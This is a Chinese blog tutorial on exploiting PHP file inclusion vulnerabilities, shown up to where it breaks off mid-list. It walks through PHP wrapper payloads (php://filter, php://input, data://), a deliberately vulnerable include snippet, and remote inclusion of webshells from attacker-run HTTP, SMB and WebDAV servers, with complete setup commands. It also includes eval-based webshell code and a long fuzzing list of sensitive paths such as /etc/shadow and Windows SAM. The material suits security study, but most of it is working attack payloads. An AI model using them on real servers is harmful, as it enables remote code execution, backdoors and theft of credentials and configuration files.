        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><ul><li>如果文件包含函数没有经过严格的过滤或者定义<br>并且参数可以被用户控制<br>这样就有可能包含非预期的文件。</li><li>如果文件中存在恶意代码，无论文件是什么类型<br>恶意代码都会被解析。</li><li>文件包含漏洞可能会造成服务器的网页被篡改，网站被挂马，服务器被远程控制，被安装后门等危害</li></ul><h1 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h1><p> PHP里面共有4个与文件包含相关的函数,分别是:</p><pre><code>include  requireinclude_oncerequire_once</code></pre><p>include和require函数的作用并没有太大的区别，这里就只放出include的说明</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123155546122.png" alt="image-20221123155546122"></p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123155609821.png" alt="image-20221123155609821"></p><h1 id="支持的协议和封装协议"><a href="#支持的协议和封装协议" class="headerlink" title="支持的协议和封装协议"></a>支持的协议和封装协议</h1><p>我们可以看到文件包含函数可以使用封装协议</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123155918249.png" alt="image-20221123155918249"></p><p><strong>支持的协议和封装协议</strong></p><pre><code class="php">•file:// — 访问本地文件系统•http:// — 访问 HTTP(s) 网址•ftp:// — 访问 FTP(s) URLs•php:// — 访问各个输入/输出流（I/O streams）•zlib:// — 压缩流•data:// — 数据（RFC 2397）•glob:// — 查找匹配的文件路径模式•phar:// — PHP 归档•ssh2:// — Secure Shell 2•rar:// — RAR•ogg:// — 音频流•expect:// — 处理交互式的流</code></pre><p>这里重点讲下常用的伪协议:</p><p>1.<code>file://</code><br> 这个协议可以展现本地文件系统,默认目录是当前的工作目录。</p><pre><code>file:///path/to/file.ext 在文件包含中其实也就是等价 /path/to/file.ext例如：file:///etc/passwd、file://key.txt但是如果来个题目给你来个正则匹配 ../ 或 / 开头的时候就可以用这个方法来绕过了。</code></pre><p>2.<code>php://</code><br> (1)<code>php://input</code>是个可以访问请求的原始数据的只读流<br> (2)<code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123160555145.png" alt="image-20221123160555145"></p><p>各种过滤器</p><pre><code class="php">(1)readfile(&quot;http://www.example.com&quot;);等价于readfile(&quot;php://filter/resource=http://www.example.com&quot;);  //这种写法等于没有设置过滤器(2)读取链file_get_contents(&quot;php://filter/read=convert.base64-encode/resource=test.php&quot;);写入链file_put_contents(&quot;php://filter/write=convert.base64-decode/resource=[file]&quot;,&quot;base64&quot;);这个点在ctf有时候会很有用,可以绕过一些waf</code></pre><p>(3)<code>php://input</code></p><pre><code class="php">可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。有自身局限性:allow_url_fopen :off/on (默认配置on)            allow_url_include:on (默认配置off)</code></pre><p>最后用一个表来总结:</p><table><thead><tr><th align="center">协议</th><th>测试php版本</th><th align="center">allow_url_fopen</th><th align="center">allow_url_include</th><th align="left">用法</th></tr></thead><tbody><tr><td align="center">file://</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">?file=file://D:/soft/phpStudy/WWW/phpcode.txt</td></tr><tr><td align="center">php://filter</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">?file=php://filter/read=convert.base64-encode/resource=./index.php</td></tr><tr><td align="center">php://input</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">on</td><td align="left">?file=php://input  [POST DATA] <?php phpinfo()?></td></tr><tr><td align="center">zip://</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">?file=zip://D:/soft/phpStudy/WWW/file.zip%23phpcode.txt</td></tr><tr><td align="center">compress.bzip2://</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">?file=compress.bzip2://D:/soft/phpStudy/WWW/file.bz2 [or]   ?file=compress.bzip2://./file.bz2</td></tr><tr><td align="center">compress.zlib://</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">?file=compress.zlib://D:/soft/phpStudy/WWW/file.gz   [or]        ?file= compress.zlib://./file.gz</td></tr><tr><td align="center">data://</td><td>&gt;=5.2</td><td align="center">on</td><td align="center">on</td><td align="left">?file=data://text/plain,<?php phpinfo()?>  [or]                       ?file=data:text/plain,<?php phpinfo()?>    [or]                              [or]                                                                                                        data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=                                                            [or]                                                                                             data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</td></tr></tbody></table><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>假设当前页面存在一个任意文件包含漏洞(无后缀限制),代码如下:</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);$file = $_GET[&#39;file&#39;];include($file);?&gt;</code></pre><h2 id="利用各种伪协议读取文件"><a href="#利用各种伪协议读取文件" class="headerlink" title="利用各种伪协议读取文件"></a>利用各种伪协议读取文件</h2><p>1.<code>file</code></p><pre><code class="php">http://127.0.0.1/index.php?file=file://E:/phpstudy_pro/WWW/flag.php</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123171144477.png" alt="image-20221123171144477"></p><p>2.<code>php://filter</code></p><pre><code class="php">http://127.0.0.1/index.php?file=php://filter/read=convert.base64-encode/resource=./index.php</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123171244526.png" alt="image-20221123171244526"></p><p>过程: 读取文件内容-&gt;base64编码-&gt;php不解析-&gt;显示base64编码</p><h2 id="GetShell思路"><a href="#GetShell思路" class="headerlink" title="GetShell思路"></a>GetShell思路</h2><h3 id="allow-url-include-开启的情况"><a href="#allow-url-include-开启的情况" class="headerlink" title="allow_url_include 开启的情况"></a>allow_url_include 开启的情况</h3><p><code>allow_url_include</code> 默认环境在php5.2之后默认为off,所以说这个用法比较鸡肋,但是平时在看phpinfo的时候可以查看下这个是否开启。</p><p><code>allow_url_fopen</code> 默认开启,所以我们可以通过利用远程url或者<code>php://</code>协议直接getshell</p><p>只有当allow_url_fopen=On和allow_url_include=On时，include等其他包含函数才会将URL代表的文件包含执行</p><p><strong>1.</strong></p><pre><code class="php">http://127.0.0.1/index.php?file=http://remote.com/shell.txt</code></pre><p>我们可以在vps上使用python快速开启一个http服务:</p><pre><code>python2 -m SimpleHTTPServer portpython3 -m http.server port</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123172420851.png" alt="image-20221123172420851"></p><p>我在里面放了一个文件内容是</p><pre><code class="php">&lt;?php phpinfo();?&gt;</code></pre><p>我们来包含一下:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123173149452.png" alt="image-20221123173149452"></p><p><strong>2.</strong></p><pre><code class="php">http://127.0.0.1/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123174036937.png" alt="image-20221123174036937"></p><p><strong>3.</strong></p><pre><code class="php">http://127.0.0.1/index.php?file=php://input PostData:&lt;?php phpinfo();?&gt;</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123173745729.png" alt="image-20221123173745729"></p><h3 id="allow-url-include-关闭双off的情况-window环境下"><a href="#allow-url-include-关闭双off的情况-window环境下" class="headerlink" title="allow_url_include 关闭双off的情况(window环境下)"></a>allow_url_include 关闭双off的情况(window环境下)</h3><p>此时我们来包含下远程文件:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153732695.png" alt="image-20221124153732695"></p><p>不过就算 <code>allow_url_include</code> and <code>allow_url_fopen</code>均为off 在<strong>window主机环境</strong>下仍然可以进行远程文件执行</p><blockquote><p>1：什么是UNC路径？UNC路径就是类似\softer这样的形式的网络路径。<br> 2：UNC为网络（主要指局域网）上资源的完整Windows 2000名称。 注意主要这个字,所以说也支持远程网络<br> 格式：\servername\sharename，其中servername是服务器名。sharename是共享资源的名称。<br> 目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。<br> 2：unc共享就是指<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%A1%AC%E7%9B%98">网络硬盘</a>的共享</p></blockquote><p>因为 <code>allow_url_include</code> 为off的时候,php不会加载远程的http 或者 ftp的url,但是没有禁止SMB的URL加载。</p><p>因为SMB share服务器需要用UNC路径去访问,而Linux没有UNC路径所以这种方法只能在window下利用</p><h4 id="利用1-UNC-gt-SMB"><a href="#利用1-UNC-gt-SMB" class="headerlink" title="利用1: UNC-&gt;SMB"></a>利用1: UNC-&gt;SMB</h4><p><strong>攻击场景</strong></p><p>当易受攻击的PHP应用程序代码尝试从受攻击者控制的SMB共享加载PHP Web  shell时，SMB共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的SMB服务器。因此，一旦易受攻击的应用程序尝试从SMB共享访问PHP Web shell，SMB服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。  </p><p><strong>利用过程:</strong></p><p>在vps上安装samba服务</p><p>依次执行以下命令:</p><pre><code class="shell">apt-get remove -y samba* 卸载 smaba 相关的软件apt-get install samba  //安装SAMBA服务器或者yum install -y samba*mkdir /var/www/html/pub/    //创建SMB共享目录chmod 0555 /var/www/html/pub/chown -R nobody:nogroup /var/www/html/pub/   //配置新创建的SMB共享目录的权限echo &gt; /etc/samba/smb.conf     //删除SAMBA服务器配置文件的默认内容</code></pre><p>将下面的内容放在<code>/etc/samba/smb.conf</code>文件中</p><pre><code class="shell">[global]workgroup = WORKGROUPserver string = Samba Server %vnetbios name = indishell-labsecurity = usermap to guest = bad username resolve order = bcast hostdns proxy = nobind interfaces only = yes[ethan]path = /var/www/html/pubwritable = noguest ok = yesguest only = yesread only = yesdirectory mode = 0555force user = nobody</code></pre><p>重新启动SAMBA服务器以应用配置文件<code>/etc/samba/smb.conf</code>中的新配置 </p><pre><code class="shell">service smbd restart </code></pre><p>成功重新启动SAMBA服务器后，尝试访问SMB共享并确保SAMBA服务器不要求凭据。(我曾尝试用centos7去搭建这个服务，但是一直无法尝试成功，可能性有多种，最终我选择了本地搭建这个服务来作为示范)</p><pre><code>\\192.168.1.104\</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153244103.png" alt="image-20221124153244103"></p><p>我们在这个里面放入一个文件，里面内容为:</p><pre><code class="php">&lt;?php phpinfo();?&gt;  // &lt;?php @eval($_POST[&#39;admin&#39;]);?&gt;</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153615623.png" alt="image-20221124153615623"></p><p>我们再来包含一下这个文件:</p><pre><code class="php">http://127.0.0.1/index.php?file=\\192.168.1.104\ethan\hy.txt</code></pre><p>我们惊讶的发现竟然又可以进行远程文件包含了</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153911758.png" alt="image-20221124153911758"></p><p>这个方法确实十分巧妙!</p><h4 id="利用2-UNC-gt-webdav"><a href="#利用2-UNC-gt-webdav" class="headerlink" title="利用2:UNC-&gt;webdav"></a>利用2:UNC-&gt;webdav</h4><blockquote><p>WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 HTTP 1.1协议的通信协议。<br>它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，<br>使应用程序可对Web Server直接读写，<br>并支持写文件锁定(Locking)及解锁(Unlock)，<br>还可以支持文件的版本控制。</p></blockquote><p><strong>攻击场景</strong></p><p>当易受攻击的PHP应用程序代码尝试从攻击者控制的WebDAV服务器共享加载PHP Web  shell时，WebDAV共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的WebDAV服务器。因此，一旦易受攻击的应用程序尝试从WebDAV共享访问PHP Web shell，WebDAV服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。</p><p><strong>利用:</strong></p><p>需要使用匿名读取访问权限配置WebDAV服务器。</p><pre><code class="shell">sudo apt-get install -y apache2  //安装Apache Web服务器sudo a2enmod davsudo a2enmod dav_fs  //在Apache配置中启用WebDAV模块sudo mkdir -p /var/www/html/webdavsudo touch /var/www/html/webdav/shell.php  //创建WebDAV共享目录webdav和 php web shellsudo chown -R www-data:www-data  /var/www/    //将文件夹所有者更改为您的Apache用户，www-data以便Apache具有对该文件夹的写访问权</code></pre><p>编辑WebDAV配置文件</p><pre><code class="shell">/etc/apache2/sites-available/000-default.conf</code></pre><p>不需要启用身份验证:</p><pre><code class="shell">DavLockDB /var/www/html/DavLock&lt;VirtualHost *:80&gt;    # The ServerName directive sets the request scheme, hostname and port that    # the server uses to identify itself. This is used when creating    # redirection URLs. In the context of virtual hosts, the ServerName    # specifies what hostname must appear in the request&#39;s Host: header to    # match this virtual host. For the default virtual host (this file) this    # value is not decisive as it is used as a last resort host regardless.    # However, you must set it for any further virtual host explicitly.    #ServerName www.example.com    ServerAdmin webmaster@localhost    DocumentRoot /var/www/html    # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,    # error, crit, alert, emerg.    # It is also possible to configure the loglevel for particular    # modules, e.g.    #LogLevel info ssl:warn    ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log    CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined    # For most configuration files from conf-available/, which are    # enabled or disabled at a global level, it is possible to    # include a line for only one particular virtual host. For example the    # following line enables the CGI configuration for this host only    # after it has been globally disabled with &quot;a2disconf&quot;.    #Include conf-available/serve-cgi-bin.conf    Alias /webdav /var/www/html/webdav     &lt;Directory /var/www/html/webdav&gt;         DAV On     &lt;/Directory&gt;&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><p>重新启动Apache服务器，以使更改生效:</p><pre><code class="shell">sudo service apache2 restart</code></pre><p>还可以使用docker搭建:</p><pre><code class="shell">docker pull https://hub.docker.com/r/bytemark/webdav  //拉取webdav镜像docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav  //用docker启动一个webdav服务器</code></pre><p>我们可以在shell.php中写入:</p><pre><code class="php">&lt;?php echo eval(system(&quot;whoami&quot;));phpinfo();?&gt;&lt;?PHP fputs(fopen(&#39;poc.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[Qftm])?&gt;&#39;);?&gt;</code></pre><p>为什么这个不能直接加载一句话木马呢，因为使用PHP文件包含函数远程加载Webdav共享文件时，不能附加消息(GET/POST)，但是我们可以自定义<code>shell.php</code>，通过服务器加载远程<code>shell.php</code>给我们自动生成一个<code>Webshell</code>。</p><p>请求构造的payload</p><pre><code>127.0.0.1/index.php?file=//193.43.142.8//webdav/shell.php</code></pre><p>我这里一直没有复现成功，就用别的大佬的图吧:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125014318694.png" alt="image-20221125014318694"></p><p>从图中可以看到远程加载<code>shell.php</code>利用成功，可以根据状态码分析其加载过程：</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125014333601.png" alt="image-20221125014333601"></p><p>其中<code>code 207</code>是由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</p><h3 id="尝试包含日志文件、环境文件等可控文件"><a href="#尝试包含日志文件、环境文件等可控文件" class="headerlink" title="尝试包含日志文件、环境文件等可控文件"></a>尝试包含日志文件、环境文件等可控文件</h3><p>这种利用方式其实在实战中是比较鸡肋的,因为默认的权限是不允许访问的,但是可以去尝试下。</p><p>不过如果主机是window系统,像phpstudy那种一键安装的都具有高权限,完全可以通过包含一些文件来getshell。</p><h4 id="Linux-系统"><a href="#Linux-系统" class="headerlink" title="Linux 系统"></a>Linux 系统</h4><p>一般在Linux系统下通过<code>apt-get install apache2</code> 默认安装的apache 或者nginx都没有权限访问这些文件</p><p>关于linux权限问题可以参考鸟哥文章</p><pre><code class="shell">root@VM-221-25-ubuntu:/var/log# ls -ll /var/log/apache2/access.log-rw-r----- 1 root adm 0 May 18 06:25 /var/log/apache2/access.logroot@VM-221-25-ubuntu:/var/log# ls -ll /var/log/nginx/access.log-rw-r----- 1 www-data adm 0 May 18 06:25 /var/log/nginx/access.logroot@VM-221-25-ubuntu:/var/log# ls -ll /var/log/drwxr-xr-x 2 root   adm           4096 May 18 06:25 nginx</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125191115735.png" alt="image-20221125191115735"></p><p>这里以<code>/var/log/apache2/access.log</code>为例子,文件拥有者为root，所属群组为adm,root用户可以<code>rw-</code>,同群组用户<code>r—</code>只可以读。</p><p>而我们的php和apache2进程的user一般是<code>www-data</code></p><pre><code>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologinroot@VM-221-25-ubuntu:/var/log# groups www-data #查看用户所属的组www-data : www-data</code></pre><p>所以说没办法访问到这些文件达到RCE目的,但是有时候有些管理员会因为方便等问题导致权限配置错误。</p><p>我们可以收集下常见路径，然后进行fuzz</p><pre><code class="shell">Linux:/etc/passwd/etc/shadow/etc/fstab/etc/host.conf/etc/motd/etc/ld.so.conf/var/www/htdocs/index.php/var/www/conf/httpd.conf/var/www/htdocs/index.html/var/httpd/conf/php.ini/var/httpd/htdocs/index.php/var/httpd/conf/httpd.conf/var/httpd/htdocs/index.html/var/httpd/conf/php.ini/var/www/index.html/var/www/index.php/opt/www/conf/httpd.conf/opt/www/htdocs/index.php/opt/www/htdocs/index.html/usr/local/apache/htdocs/index.html/usr/local/apache/htdocs/index.php/usr/local/apache2/htdocs/index.html/usr/local/apache2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.html/tmp/apache/htdocs/index.html/tmp/apache/htdocs/index.php/etc/httpd/htdocs/index.php/etc/httpd/conf/httpd.conf/etc/httpd/htdocs/index.html/www/php/php.ini/www/php4/php.ini/www/php5/php.ini/www/conf/httpd.conf/www/htdocs/index.php/www/htdocs/index.html/usr/local/httpd/conf/httpd.conf/apache/apache/conf/httpd.conf/apache/apache2/conf/httpd.conf/etc/apache/apache.conf/etc/apache2/apache.conf/etc/apache/httpd.conf/etc/apache2/httpd.conf/etc/apache2/vhosts.d/00_default_vhost.conf/etc/apache2/sites-available/default/etc/phpmyadmin/config.inc.php/etc/mysql/my.cnf/etc/httpd/conf.d/php.conf/etc/httpd/conf.d/httpd.conf/etc/httpd/logs/error_log/etc/httpd/logs/error.log/etc/httpd/logs/access_log/etc/httpd/logs/access.log/home/apache/conf/httpd.conf/home/apache2/conf/httpd.conf/var/log/apache/error_log/var/log/apache/error.log/var/log/apache/access_log/var/log/apache/access.log/var/log/apache2/error_log/var/log/apache2/error.log/var/log/apache2/access_log/var/log/apache2/access.log/var/www/logs/error_log/var/www/logs/error.log/var/www/logs/access_log/var/www/logs/access.log/usr/local/apache/logs/error_log/usr/local/apache/logs/error.log/usr/local/apache/logs/access_log/usr/local/apache/logs/access.log/var/log/error_log/var/log/error.log/var/log/access_log/var/log/access.log/usr/local/apache/logs/access_logaccess_log.old/usr/local/apache/logs/error_logerror_log.old/etc/php.ini/bin/php.ini/etc/init.d/httpd/etc/init.d/mysql/etc/httpd/php.ini/usr/lib/php.ini/usr/lib/php/php.ini/usr/local/etc/php.ini/usr/local/lib/php.ini/usr/local/php/lib/php.ini/usr/local/php4/lib/php.ini/usr/local/php4/php.ini/usr/local/php4/lib/php.ini/usr/local/php5/lib/php.ini/usr/local/php5/etc/php.ini/usr/local/php5/php5.ini/usr/local/apache/conf/php.ini/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/usr/local/apache2/conf/php.ini/etc/php4.4/fcgi/php.ini/etc/php4/apache/php.ini/etc/php4/apache2/php.ini/etc/php5/apache/php.ini/etc/php5/apache2/php.ini/etc/php/php.ini/etc/php/php4/php.ini/etc/php/apache/php.ini/etc/php/apache2/php.ini/web/conf/php.ini/usr/local/Zend/etc/php.ini/opt/xampp/etc/php.ini/var/local/www/conf/php.ini/var/local/www/conf/httpd.conf/etc/php/cgi/php.ini/etc/php4/cgi/php.ini/etc/php5/cgi/php.ini/php5/php.ini/php4/php.ini/php/php.ini/PHP/php.ini/apache/php/php.ini/xampp/apache/bin/php.ini/xampp/apache/conf/httpd.conf/NetServer/bin/stable/apache/php.ini/home2/bin/stable/apache/php.ini/home/bin/stable/apache/php.ini/var/log/mysql/mysql-bin.log/var/log/mysql.log/var/log/mysqlderror.log/var/log/mysql/mysql.log/var/log/mysql/mysql-slow.log/var/mysql.log/var/lib/mysql/my.cnf/usr/local/mysql/my.cnf/usr/local/mysql/bin/mysql/etc/mysql/my.cnf/etc/my.cnf/usr/local/cpanel/logs/usr/local/cpanel/logs/stats_log/usr/local/cpanel/logs/access_log/usr/local/cpanel/logs/error_log/usr/local/cpanel/logs/license_log/usr/local/cpanel/logs/login_log/usr/local/cpanel/logs/stats_log/usr/local/share/examples/php4/php.ini/usr/local/share/examples/php/php.iniwindows:c:\windows\php.inic:\boot.inic:\1.txtc:\a.txtc:\CMailServer\config.inic:\CMailServer\CMailServer.exec:\CMailServer\WebMail\index.aspc:\program files\CMailServer\CMailServer.exec:\program files\CMailServer\WebMail\index.aspC:\WinWebMail\SysInfo.iniC:\WinWebMail\Web\default.aspC:\WINDOWS\FreeHost32.dllC:\WINDOWS\7i24iislog4.exeC:\WINDOWS\7i24tool.exec:\hzhost\databases\url.aspc:\hzhost\hzclient.exeC:\Documents and Settings\All Users\「开始」菜单\程序\7i24虚拟主机管理平台\自动设置[受控端].lnkC:\Documents and Settings\All Users\「开始」菜单\程序\Serv-U\Serv-U Administrator.lnkC:\WINDOWS\web.configc:\web\index.htmlc:\www\index.htmlc:\WWWROOT\index.htmlc:\website\index.htmlc:\web\index.aspc:\www\index.aspc:\wwwsite\index.aspc:\WWWROOT\index.aspc:\web\index.phpc:\www\index.phpc:\WWWROOT\index.phpc:\WWWsite\index.phpc:\web\default.htmlc:\www\default.htmlc:\WWWROOT\default.htmlc:\website\default.htmlc:\web\default.aspc:\www\default.aspc:\wwwsite\default.aspc:\WWWROOT\default.aspc:\web\default.phpc:\www\default.phpc:\WWWROOT\default.phpc:\WWWsite\default.phpC:\Inetpub\wwwroot\pagerror.gifc:\windows\notepad.exec:\winnt\notepad.exeC:\Program Files\Microsoft Office\OFFICE10\winword.exeC:\Program Files\Microsoft Office\OFFICE11\winword.exeC:\Program Files\Microsoft Office\OFFICE12\winword.exeC:\Program Files\Internet Explorer\IEXPLORE.EXEC:\Program Files\winrar\rar.exeC:\Program Files\360\360Safe\360safe.exeC:\Program Files\360Safe\360safe.exeC:\Documents and Settings\Administrator\Application Data\360Safe\360Examine\360Examine.logc:\ravbin\store.inic:\rising.iniC:\Program Files\Rising\Rav\RsTask.xmlC:\Documents and Settings\All Users\Start Menu\desktop.iniC:\Documents and Settings\Administrator\My Documents\Default.rdpC:\Documents and Settings\Administrator\Cookies\index.datC:\Documents and Settings\Administrator\My Documents\新建 文本文档.txtC:\Documents and Settings\Administrator\桌面\新建 文本文档.txtC:\Documents and Settings\Administrator\My Documents\1.txtC:\Documents and Settings\Administrator\桌面\1.txtC:\Documents and Settings\Administrator\My Documents\a.txtC:\Documents and Settings\Administrator\桌面\a.txtC:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpgE:\Inetpub\wwwroot\aspnet_client\system_web\1_1_4322\SmartNav.htmC:\Program Files\RhinoSoft.com\Serv-U\Version.txtC:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.iniC:\Program Files\Symantec\SYMEVENT.INFC:\Program Files\Microsoft SQL Server\80\Tools\Binn\sqlmangr.exeC:\Program Files\Microsoft SQL Server\MSSQL\Data\master.mdfC:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data\master.mdfC:\Program Files\Microsoft SQL Server\MSSQL.2\MSSQL\Data\master.mdfC:\Program Files\Microsoft SQL Server\80\Tools\HTML\database.htmC:\Program Files\Microsoft SQL Server\MSSQL\README.TXTC:\Program Files\Microsoft SQL Server\90\Tools\Bin\DdsShapes.dllC:\Program Files\Microsoft SQL Server\MSSQL\sqlsunin.iniC:\MySQL\MySQL Server 5.0\my.iniC:\Program Files\MySQL\MySQL Server 5.0\my.iniC:\Program Files\MySQL\MySQL Server 5.0\data\mysql\user.frmC:\Program Files\MySQL\MySQL Server 5.0\COPYINGC:\Program Files\MySQL\MySQL Server 5.0\share\mysql_fix_privilege_tables.sqlC:\Program Files\MySQL\MySQL Server 4.1\bin\mysql.exec:\MySQL\MySQL Server 4.1\bin\mysql.exec:\MySQL\MySQL Server 4.1\data\mysql\user.frmC:\Program Files\Oracle\oraconfig\Lpk.dllC:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exeC:\WINDOWS\system32\inetsrv\w3wp.exeC:\WINDOWS\system32\inetsrv\inetinfo.exeC:\WINDOWS\system32\inetsrv\MetaBase.xmlC:\WINDOWS\system32\inetsrv\iisadmpwd\achg.aspC:\WINDOWS\system32\config\default.LOGC:\WINDOWS\system32\config\samC:\WINDOWS\system32\config\systemc:\CMailServer\config.inic:\program files\CMailServer\config.inic:\tomcat6\tomcat6\bin\version.shc:\tomcat6\bin\version.shc:\tomcat\bin\version.shc:\program files\tomcat6\bin\version.shC:\Program Files\Apache Software Foundation\Tomcat 6.0\bin\version.shc:\Program Files\Apache Software Foundation\Tomcat 6.0\logs\isapi_redirect.logc:\Apache2\Apache2\bin\Apache.exec:\Apache2\bin\Apache.exec:\Apache2\php\license.txtC:\Program Files\Apache Group\Apache2\bin\Apache.exec:\Program Files\QQ2007\qq.exec:\Program Files\Tencent\qq\User.dbc:\Program Files\Tencent\qq\qq.exec:\Program Files\Tencent\qq\bin\qq.exec:\Program Files\Tencent\qq2009\qq.exec:\Program Files\Tencent\qq2008\qq.exec:\Program Files\Tencent\qq2010\bin\qq.exec:\Program Files\Tencent\qq\Users\All Users\Registry.dbC:\Program Files\Tencent\TM\TMDlls\QQZip.dllc:\Program Files\Tencent\Tm\Bin\Txplatform.exec:\Program Files\Tencent\RTXServer\AppConfig.xmlC:\Program Files\Foxmal\Foxmail.exeC:\Program Files\Foxmal\accounts.cfgC:\Program Files\tencent\Foxmal\Foxmail.exeC:\Program Files\tencent\Foxmal\accounts.cfgC:\Program Files\LeapFTP 3.0\LeapFTP.exeC:\Program Files\LeapFTP\LeapFTP.exec:\Program Files\GlobalSCAPE\CuteFTP Pro\cftppro.exec:\Program Files\GlobalSCAPE\CuteFTP Pro\notes.txtC:\Program Files\FlashFXP\FlashFXP.iniC:\Program Files\FlashFXP\flashfxp.exec:\Program Files\Oracle\bin\regsvr32.exec:\Program Files\腾讯游戏\QQGAME\readme.txtc:\Program Files\tencent\腾讯游戏\QQGAME\readme.txtc:\Program Files\tencent\QQGAME\readme.txtC:\Program Files\StormII\Storm.exe网站相对路径:/config.php../../config.php../config.php../../../config.php/config.inc.php./config.inc.php../../config.inc.php../config.inc.php../../../config.inc.php/conn.php./conn.php../../conn.php../conn.php../../../conn.php/conn.asp./conn.asp../../conn.asp../conn.asp../../../conn.asp/config.inc.php./config.inc.php../../config.inc.php../config.inc.php../../../config.inc.php/config/config.php../../config/config.php../config/config.php../../../config/config.php/config/config.inc.php./config/config.inc.php../../config/config.inc.php../config/config.inc.php../../../config/config.inc.php/config/conn.php./config/conn.php../../config/conn.php../config/conn.php../../../config/conn.php/config/conn.asp./config/conn.asp../../config/conn.asp../config/conn.asp../../../config/conn.asp/config/config.inc.php./config/config.inc.php../../config/config.inc.php../config/config.inc.php../../../config/config.inc.php/data/config.php../../data/config.php../data/config.php../../../data/config.php/data/config.inc.php./data/config.inc.php../../data/config.inc.php../data/config.inc.php../../../data/config.inc.php/data/conn.php./data/conn.php../../data/conn.php../data/conn.php../../../data/conn.php/data/conn.asp./data/conn.asp../../data/conn.asp../data/conn.asp../../../data/conn.asp/data/config.inc.php./data/config.inc.php../../data/config.inc.php../data/config.inc.php../../../data/config.inc.php/include/config.php../../include/config.php../include/config.php../../../include/config.php/include/config.inc.php./include/config.inc.php../../include/config.inc.php../include/config.inc.php../../../include/config.inc.php/include/conn.php./include/conn.php../../inclu